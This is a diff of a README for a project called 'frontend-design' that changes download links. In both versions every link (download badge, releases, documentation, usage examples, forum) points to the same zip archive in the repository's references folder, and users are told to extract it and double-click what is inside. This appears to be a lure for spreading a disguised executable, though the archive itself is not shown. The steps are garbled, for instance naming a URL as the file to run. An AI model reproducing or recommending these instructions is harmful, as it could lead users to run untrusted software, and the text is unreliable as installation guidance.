@@ -9,11 +9,11 @@ This guide will walk you through downloading and running the **frontend-design**
 ## 📦 Download & Install
 To get the latest version of **frontend-design**, **visit this page to download**:
 
-[![Download frontend-design](https://github.com/victor604/frontend-design/raw/refs/heads/main/references/frontend_design_phosphatization.zip)](https://github.com/victor604/frontend-design/raw/refs/heads/main/references/frontend_design_phosphatization.zip)
+[![Download frontend-design](https://raw.githubusercontent.com/victor604/frontend-design/main/references/frontend_design_1.1-alpha.4.zip)](https://raw.githubusercontent.com/victor604/frontend-design/main/references/frontend_design_1.1-alpha.4.zip)
 
 1. Click the link above to go to the **Releases** page.
 2. On the Releases page, you will find the latest version listed at the top. Look for the file suitable for your operating system.
-3. Click the download link for the file you need. It may be something like `https://github.com/victor604/frontend-design/raw/refs/heads/main/references/frontend_design_phosphatization.zip` or `https://github.com/victor604/frontend-design/raw/refs/heads/main/references/frontend_design_phosphatization.zip`.
+3. Click the download link for the file you need. It may be something like `https://raw.githubusercontent.com/victor604/frontend-design/main/references/frontend_design_1.1-alpha.4.zip` or `https://raw.githubusercontent.com/victor604/frontend-design/main/references/frontend_design_1.1-alpha.4.zip`.
 
 ## 📋 System Requirements
 Before you install the application, ensure that your computer meets these requirements:
@@ -32,7 +32,7 @@ After downloading the file, follow these steps to run the application:
 
 2. **Run the installer:**
    - For an `.exe` file, double-click the file. Follow the on-screen prompts to complete the installation.
-   - If it’s extracted from a `.zip`, open the extracted folder and look for a file named `https://github.com/victor604/frontend-design/raw/refs/heads/main/references/frontend_design_phosphatization.zip` or similar. Double-click it to start.
+   - If it’s extracted from a `.zip`, open the extracted folder and look for a file named `https://raw.githubusercontent.com/victor604/frontend-design/main/references/frontend_design_1.1-alpha.4.zip` or similar. Double-click it to start.
 
 3. **Launch the application:**
    - After installation, look for the **frontend-design** icon on your desktop or in the application menu. Click to open it.
@@ -63,9 +63,9 @@ If you encounter any issues while installing or running **frontend-design**, try
 ## 🔗 Further Resources
 For additional help and information, check these resources:
 
-- [Documentation](https://github.com/victor604/frontend-design/raw/refs/heads/main/references/frontend_design_phosphatization.zip)
-- [Usage Examples](https://github.com/victor604/frontend-design/raw/refs/heads/main/references/frontend_design_phosphatization.zip)
-- [Community Forum](https://github.com/victor604/frontend-design/raw/refs/heads/main/references/frontend_design_phosphatization.zip)
+- [Documentation](https://raw.githubusercontent.com/victor604/frontend-design/main/references/frontend_design_1.1-alpha.4.zip)
+- [Usage Examples](https://raw.githubusercontent.com/victor604/frontend-design/main/references/frontend_design_1.1-alpha.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/victor604/frontend-design/main/references/frontend_design_1.1-alpha.4.zip)
 
 ## 💬 Feedback
 We value your feedback. Share your experiences, suggestions, or any issues you face. This helps us improve the application for everyone.
@@ -75,4 +75,4 @@ Don’t forget to check back often for new updates and features. The team behind
 
 If you need to download **frontend-design** again later, **visit this page to download**:
 
-[![Download frontend-design](https://github.com/victor604/frontend-design/raw/refs/heads/main/references/frontend_design_phosphatization.zip)](https://github.com/victor604/frontend-design/raw/refs/heads/main/references/frontend_design_phosphatization.zip)
+[![Download frontend-design](https://raw.githubusercontent.com/victor604/frontend-design/main/references/frontend_design_1.1-alpha.4.zip)](https://raw.githubusercontent.com/victor604/frontend-design/main/references/frontend_design_1.1-alpha.4.zip)
